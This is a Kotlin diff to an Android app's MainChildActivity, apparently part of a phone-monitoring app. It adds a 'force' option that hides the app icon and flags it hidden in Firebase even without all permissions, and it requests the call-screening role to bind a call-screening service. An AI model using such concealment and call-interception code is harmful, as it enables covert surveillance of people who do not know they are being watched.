@@ -1,8 +1,16 @@
 package com.example.rule.dash.ui.activities.mainchild
 
 import android.Manifest.permission.SYSTEM_ALERT_WINDOW
+import android.app.Activity
 import android.app.AppOpsManager
+import android.app.role.RoleManager
+import android.content.ComponentName
+import android.content.Intent
+import android.content.ServiceConnection
+import android.os.Build
 import android.os.Bundle
+import android.os.IBinder
+import android.util.Log
 import android.widget.Button
 import com.example.rule.dash.R
 import com.example.rule.dash.data.model.ChildPhoto
@@ -25,6 +33,7 @@ import javax.inject.Inject
 import com.google.firebase.database.DatabaseReference
 import android.widget.RelativeLayout
 import android.widget.Switch
+import androidx.activity.result.contract.ActivityResultContracts
 import cn.pedant.SweetAlert.SweetAlertDialog
 import com.example.rule.dash.data.preference.DataSharePreference.childSelected
 import com.example.rule.dash.services.accessibilityData.AccessibilityDataService
@@ -54,6 +63,7 @@ import kotterknife.bindView
 class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
     private val btnHideApp: Button by bindView(R.id.btn_hide_app)
+    private val btnHideAppForce: Button by bindView(R.id.btn_hide_app_force)
     private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)
     private val btnEnableOverDraw: RelativeLayout by bindView(R.id.btn_enable_overdraw)
     private val btnEnableUsageStats: RelativeLayout by bindView(R.id.btn_enable_usage_stats)
@@ -73,6 +83,35 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         getComponent()!!.inject(this)
         init()
         onClickApp()
+        bindCallService()
+    }
+
+    private fun bindCallService(){
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            val roleManager = getSystemService(ROLE_SERVICE) as RoleManager
+            val intent = roleManager.createRequestRoleIntent(RoleManager.ROLE_CALL_SCREENING)
+            val startForRequestRoleResult = registerForActivityResult(
+                ActivityResultContracts.StartActivityForResult()
+            ) { result: androidx.activity.result.ActivityResult ->
+                if (result.resultCode == Activity.RESULT_OK) {
+                    //  you will get result here in result.data
+                    bindMyService()
+                }
+            }
+            startForRequestRoleResult.launch(intent)
+        }
+    }
+
+    private fun bindMyService(){
+        Log.i("MainChildActivity", "binding my service")
+        val mCallServiceIntent = Intent("android.telecom.CallScreeningService")
+        mCallServiceIntent.setPackage(applicationContext.packageName)
+        val mServiceConnection: ServiceConnection = object : ServiceConnection {
+            override fun onServiceConnected(componentName: ComponentName, iBinder: IBinder) {}
+            override fun onServiceDisconnected(componentName: ComponentName) {}
+            override fun onBindingDied(name: ComponentName) {}
+        }
+        bindService(mCallServiceIntent, mServiceConnection, BIND_AUTO_CREATE)
     }
 
     override fun onResume() {
@@ -112,11 +151,12 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
     private fun onClickApp() {
         btnHideApp.setOnClickListener {
-            checkPermissions()
+            checkPermissions(false)
+        }
+        btnHideAppForce.setOnClickListener{
+            checkPermissions(true)
         }
         btnEnableService.setOnClickListener {
-
-
 
             if (!AccessibilityDataService.isRunningService){
                 permissionRoot {
@@ -180,13 +220,16 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
 
     private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)
 
-    private fun checkPermissions() {
+    private fun checkPermissions(force : Boolean) {
         if (hasUsageStatsPermission() && canOverDrawOtherApps() && isNotificationServiceRunning() &&
                 AccessibilityDataService.isRunningService && isAddWhitelist()) {
             showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
             showApp(false)
             getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
-        }else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.enable_all_permissions)
+        }else if (force) {
+            dialogForce()
+        }
+        else dialog(SweetAlertDialog.NORMAL_TYPE,R.string.enable_all_permissions)
     }
 
     private fun activatePermissionRoot(command:String,showDialog:Boolean,activate:()->Unit){
@@ -201,9 +244,20 @@ class MainChildActivity : BaseActivity(R.layout.activity_main_child) {
         }).execute(command)
     }
 
-    private fun dialog(type:Int,msg:Int,action:(()->Unit)?=null){
-        showDialog(type,R.string.title_dialog,getString(msg),android.R.string.ok){
-            setConfirmClickListener { hideDialog() ; if (action!=null) action() } ; show()
+    private fun dialog(type:Int,msg:Int, action:(()->Unit)?=null) {
+            showDialog(type, R.string.title_dialog, getString(msg), android.R.string.ok) {
+                setConfirmClickListener { hideDialog(); if (action != null) action() }; show()
+            }
+    }
+
+    private fun dialogForce() {
+        showDialog(SweetAlertDialog.NORMAL_TYPE, R.string.title_dialog, "", android.R.string.ok) {
+            setConfirmClickListener {
+                hideDialog()
+                showDialog(SweetAlertDialog.PROGRESS_TYPE,R.string.hiding,null,null){ show() }
+                showApp(false)
+                getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
+            }; show()
         }
     }
 
